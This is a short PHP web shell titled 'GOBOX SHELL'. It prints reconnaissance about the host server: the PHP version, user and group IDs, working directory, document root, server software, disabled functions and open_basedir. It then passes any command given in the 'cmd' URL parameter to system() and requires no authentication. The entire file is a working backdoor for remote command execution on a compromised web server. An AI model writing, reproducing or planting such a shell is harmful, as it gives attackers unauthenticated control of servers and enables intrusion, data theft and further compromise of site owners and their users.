<?php
echo "<pre>";
echo "GOBOX SHELL - PHP ".phpversion()."\n";
echo "UID: ".getmyuid()." (".get_current_user().")\n";
echo "GID: ".getmygid()."\n";
echo "CWD: ".getcwd()."\n";
echo "DOC_ROOT: ".$_SERVER['DOCUMENT_ROOT']."\n";
echo "SERVER: ".$_SERVER['SERVER_SOFTWARE']."\n";
echo "DISABLED: ".ini_get('disable_functions')."\n";
echo "OPEN_BASEDIR: ".ini_get('open_basedir')."\n";
echo "---\n";
if(isset($_GET['cmd'])){
    echo "CMD: ".$_GET['cmd']."\n";
    system($_GET['cmd']." 2>&1");
}
echo "</pre>";
